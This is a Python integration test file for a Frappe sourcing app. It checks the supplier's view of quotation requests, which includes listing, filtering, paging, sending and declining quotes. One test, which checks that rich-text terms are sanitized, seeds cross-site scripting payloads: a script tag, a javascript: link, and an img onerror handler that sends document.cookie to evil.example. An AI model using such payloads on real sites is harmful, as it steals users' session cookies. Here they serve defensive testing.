# Copyright (c) 2026, Vuna Technologies and contributors
# For license information, please see license.txt

import frappe
from frappe.tests import IntegrationTestCase
from frappe.utils import add_days, getdate, nowdate

from vuna_sourcing.api.transactions.supplier import (
	decline_quote,
	get_rfq,
	get_rfqs,
	send_quote,
)
from vuna_sourcing.tests.sourcing_fixtures import SourcingFixtures


class TestSupplierRFQ(SourcingFixtures, IntegrationTestCase):
	"""The supplier's side of a quotation request, run as the supplier."""

	def test_an_invited_supplier_sees_the_request(self):
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			page = get_rfqs()

		self.assertEqual([row["name"] for row in page["rows"]], [rfq.name])
		self.assertEqual(page["total"], 1)
		self.assertEqual(page["counts"], {"Invited": 1})
		self.assertEqual(page["rows"][0]["status"], "Invited")
		self.assertEqual(page["rows"][0]["items"], 1)

	def test_a_supplier_who_was_not_invited_sees_nothing(self):
		invited, _user = self.make_supplier()
		_other, outsider = self.make_supplier()
		rfq = self.make_rfq([invited])

		with self.set_user(outsider):
			self.assertEqual(get_rfqs()["rows"], [])
			self.assertRaises(frappe.PermissionError, get_rfq, rfq.name)

	def test_the_list_filters_by_status_and_searches_by_number(self):
		supplier, user = self.make_supplier()
		open_request = self.make_rfq([supplier])
		closed_request = self.make_rfq([supplier], required_by=add_days(nowdate(), -1))

		with self.set_user(user):
			self.assertEqual(get_rfqs()["total"], 2)

			invited = get_rfqs(status="Invited")
			self.assertEqual([row["name"] for row in invited["rows"]], [open_request.name])
			self.assertEqual(
				invited["counts"],
				{"Invited": 1, "Closed": 1},
				"counts describe everything, not just the filtered rows",
			)

			self.assertEqual(get_rfqs(status="Closed")["rows"][0]["name"], closed_request.name)
			self.assertEqual(get_rfqs(status="Submitted")["rows"], [])

			found = get_rfqs(search=open_request.name[-5:])
			self.assertEqual([row["name"] for row in found["rows"]], [open_request.name])
			self.assertEqual(get_rfqs(search="nothing-like-this")["total"], 0)

	def test_the_list_pages(self):
		supplier, user = self.make_supplier()
		for _ in range(3):
			self.make_rfq([supplier])

		with self.set_user(user):
			first = get_rfqs(start=0, limit=2)
			second = get_rfqs(start=2, limit=2)

		self.assertEqual(len(first["rows"]), 2)
		self.assertEqual(first["total"], 3, "the total counts every match, not the page")
		self.assertEqual(len(second["rows"]), 1)
		self.assertFalse(
			{row["name"] for row in first["rows"]} & {row["name"] for row in second["rows"]},
			"pages do not overlap",
		)

	def test_the_detail_carries_what_the_supplier_must_answer(self):
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			detail = get_rfq(rfq.name)

		self.assertEqual(detail["supplier"], supplier)
		self.assertTrue(detail["can_quote"])
		self.assertEqual(getdate(detail["required_by"]), getdate(rfq.schedule_date))
		self.assertNotIn("message", detail, "the buyer's covering note stays in the email")
		self.assertEqual([item["item_code"] for item in detail["items"]], [self.item])
		self.assertEqual(detail["items"][0]["qty"], 5)

	def test_the_terms_reach_the_supplier_as_html_with_nothing_that_can_run(self):
		"""Terms are rich text the portal renders as HTML, so they leave here defanged."""
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])
		rfq.db_set(
			"terms",
			"<p>Payment <b>30 days</b>.</p><script>alert(1)</script>"
			"<img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\">"
			'<a href="javascript:alert(2)">click</a>',
		)

		with self.set_user(user):
			terms = get_rfq(rfq.name)["terms"]

		self.assertIn("<b>30 days</b>", terms, "the formatting the buyer wrote survives")
		self.assertNotIn("<script", terms)
		self.assertNotIn("onerror", terms)
		self.assertNotIn("javascript:", terms)

	def test_nothing_is_written_until_the_supplier_sends(self):
		"""A half-filled quote would be a draft on the desk that a buyer could submit."""
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			self.assertRaises(
				frappe.ValidationError,
				send_quote,
				rfq.name,
				items=self.lines(get_rfq(rfq.name), rate=0),
				valid_till=add_days(nowdate(), 30),
			)

		self.assertFalse(
			frappe.db.exists("Supplier Quotation", {"supplier": supplier}),
			"a refused send leaves no quotation behind",
		)

	def test_sending_needs_a_price_on_every_line_and_a_validity(self):
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			detail = get_rfq(rfq.name)

			self.assertRaises(
				frappe.ValidationError,
				send_quote,
				rfq.name,
				items=self.lines(detail, rate=0),
				valid_till=add_days(nowdate(), 30),
			)

			self.assertRaises(
				frappe.ValidationError,
				send_quote,
				rfq.name,
				items=self.lines(detail, rate=100),
			)

	def test_a_sent_quote_is_final_but_stays_a_draft_for_the_buyer(self):
		"""Submitting the Supplier Quotation is the buyer's decision, never the supplier's."""
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			detail = send_quote(
				rfq.name,
				items=self.lines(get_rfq(rfq.name)),
				quotation_number="Q-2026-001",
				valid_till=add_days(nowdate(), 30),
			)

			self.assertEqual(detail["status"], "Submitted")
			self.assertFalse(detail["can_quote"])
			self.assertRaises(frappe.ValidationError, send_quote, rfq.name, items=self.lines(detail))
			self.assertRaises(frappe.ValidationError, decline_quote, rfq.name, reason="Changed my mind")

		quote = frappe.get_doc("Supplier Quotation", detail["quote"]["name"])
		self.assertEqual(quote.docstatus, 0, "the buyer submits it, not the supplier")
		self.assertEqual(quote.supplier, supplier)
		self.assertEqual(quote.quotation_number, "Q-2026-001")
		self.assertEqual(quote.items[0].request_for_quotation, rfq.name)
		self.assertEqual(quote.owner, user, "the portal user owns what they sent")

		rfq.reload()
		self.assertEqual(rfq.suppliers[0].quote_status, "Received")

	def test_a_supplier_can_decline_with_a_reason(self):
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier])

		with self.set_user(user):
			detail = decline_quote(rfq.name, reason="We do not stock this item.")

		self.assertEqual(detail["status"], "Declined")
		self.assertFalse(detail["can_quote"])
		self.assertEqual(
			frappe.db.get_value("Request for Quotation Supplier", {"parent": rfq.name}, "quote_status"),
			"No Quote",
		)
		self.assertIn(
			"No Quote",
			frappe.get_meta("Request for Quotation Supplier").get_field("quote_status").options.split("\n"),
			"a declined supplier is stored with a status the field allows",
		)
		self.assertTrue(
			frappe.db.exists("Comment", {"reference_name": rfq.name, "content": ("like", "%do not stock%")})
		)

	def test_quoting_stops_once_the_request_is_past_its_required_by_date(self):
		supplier, user = self.make_supplier()
		rfq = self.make_rfq([supplier], required_by=add_days(nowdate(), -1))

		with self.set_user(user):
			detail = get_rfq(rfq.name)
			self.assertTrue(detail["closed"])
			self.assertEqual(detail["status"], "Closed")
			self.assertFalse(detail["can_quote"])
			self.assertRaises(frappe.ValidationError, send_quote, rfq.name, items=self.lines(detail))
